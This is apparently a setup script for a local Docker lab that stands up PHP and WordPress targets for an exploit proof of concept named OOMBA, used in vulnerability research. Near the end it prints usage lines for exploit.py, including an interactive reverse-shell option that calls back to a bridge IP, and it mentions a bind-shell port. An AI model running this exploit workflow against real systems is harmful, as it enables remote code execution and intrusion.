#!/bin/sh
# OOMBA lab bring-up (docker compose variant).
#
#   127.0.0.1:8088  plain PHP 8.4.26   (ASLR on)
#   127.0.0.1:8091  WordPress 7.1.3    (8.4.26, ASLR on; /oomba_test.php entry)
#   127.0.0.1:8092  WordPress 7.1.2    (8.4.26, ASLR on, +bind port 4501)
#   127.0.0.1:8094  WordPress 7.1.3 on PHP 7.4.33 (strand works, leak gated — ANALYSIS.md 5.3)
#
# (Roundcube 1.6.19 — retired from the lab; findings kept in
#  ANALYSIS.md 5.2 / KNOWLEDGE.md.)
#
# All targets run ASLR ON (the realistic case; the plain /oomba_test.php
# entry makes the WP leaks deterministic without disabling ASLR — the WP
# bootstrap pages perturb the request-B heap, plain entries do not).
#
# Everything this script needs lives in POC/oomba/ (self-contained on a
# fresh VM): files/php.ini, files/single.conf, files/wp743-php.ini,
# docker-compose.yml. The WordPress webroots are created from the
# wordpress:7.1.3-php8.4-apache / wordpress:7.1.2-php8.4-apache images
# (extract once with `docker create` + `docker cp`; image tarballs can be
# pulled from the Windows host with tools/docker_pull.py when the docker
# proxy is down). The WP config (wp-config.php + SQLite drop-in) comes
# from the previously-calibrated setup; on a fresh VM copy those two
# files from this repo's refs or from a working webroot:
#   wp-config.php + wp-content/db.php (aaemnnosttv/wp-sqlite-db drop-in)
#
# Run from the VM:  sh POC/oomba/docker_lab.sh   (from the repo root, or
#                   anywhere with the POC/oomba folder)
set -e
HERE=$(cd "$(dirname "$0")" && pwd)          # POC/oomba
OUT=${OUT:-$HERE/../out}                     # proof files land here

cd "$HERE"
mkdir -p webroots "$OUT"

# ---- create the WordPress webroots from the official images (once) ----
for V in 7.1.3 7.1.2; do
  ROOT=webroots/wp${V%%.*}${V#7.}           # wp713 / wp712
  ROOT=$(echo "$ROOT" | sed 's/7\.//')      # wp713 -> wp713
  ROOT=webroots/$(echo "wp$V" | tr -d '.')
  if [ ! -d "$ROOT/wp-includes" ]; then
    if sudo docker image inspect wordpress:$V-php8.4-apache >/dev/null 2>&1; then
      echo "extracting wordpress:$V-php8.4 files -> $ROOT"
      sudo docker rm -f oomba-extract >/dev/null 2>&1 || true
      sudo docker create --name oomba-extract wordpress:$V-php8.4-apache >/dev/null
      sudo docker cp oomba-extract:/usr/src/wordpress/. "$ROOT/"
      sudo docker rm -f oomba-extract >/dev/null
    else
      echo "note: wordpress:$V-php8.4-apache image not present - $ROOT stays absent (fetch it with tools/docker_pull.py)"
    fi
  fi
done

# ---- WP 7.1.3 webroot for the 7.4.33 target (copy of wp713) ----
if [ -d webroots/wp713/wp-includes ] && [ ! -d webroots/wp743/wp-includes ]; then
  echo "creating webroots/wp743 (copy of wp713)"
  cp -r webroots/wp713 webroots/wp743
fi

# ---- WP config for each webroot (wp-config.php + SQLite drop-in) ----
# copy from the first webroot that already has them (fresh-VM users: put
# a calibrated wp-config.php + wp-content/db.php into webroots/wp713 first)
if [ -f webroots/wp713/wp-config.php ] && [ -f webroots/wp713/wp-content/db.php ]; then
  for W in wp712 wp743; do
    if [ -d webroots/$W ] && [ ! -f webroots/$W/wp-config.php ]; then
      cp webroots/wp713/wp-config.php webroots/$W/
      cp webroots/wp713/wp-content/db.php webroots/$W/wp-content/ 2>/dev/null || {
        mkdir -p webroots/$W/wp-content; cp webroots/wp713/wp-content/db.php webroots/$W/wp-content/; }
    fi
  done
fi
sudo chmod -R a+rw webroots 2>/dev/null || true

# ---- bring the lab up ----
sudo docker compose -f docker-compose.yml up -d 2>&1 | grep -v "^$" | tail -6

sleep 6
echo
echo "targets:"
echo "  plain  : $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8088/index.php)  http://127.0.0.1:8088/index.php"
if [ -d webroots/wp713 ]; then
  echo "  wp713  : $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8091/oomba_test.php)  http://127.0.0.1:8091/oomba_test.php"
fi
if [ -d webroots/wp712 ]; then
  echo "  wp712  : $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8092/oomba_test.php)  http://127.0.0.1:8092/oomba_test.php   (bind shell port 4501 published)"
fi
if [ -d webroots/wp743 ]; then
  echo "  wp743  : $(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8094/oomba_test.php)  http://127.0.0.1:8094/oomba_test.php  [leak gated: ANALYSIS.md 5.3]"
fi
echo
echo "exploit (zero-config; interactive reverse shell via the bridge IP):"
echo "  python3 POC/oomba/exploit.py -u http://127.0.0.1:8092/oomba_test.php --interactive-reverse 172.17.0.1:4500"
echo
echo "leak only (addresses, no payload fired):"
echo "  python3 POC/oomba/exploit.py -u http://127.0.0.1:8092/oomba_test.php --leak-only"
echo
echo "verbose debug tier:"
echo "  python3 POC/oomba/exploit.py -u http://127.0.0.1:8092/oomba_test.php --leak-only --verbose"
echo
echo "teardown:  sudo docker compose -f POC/oomba/docker-compose.yml down"
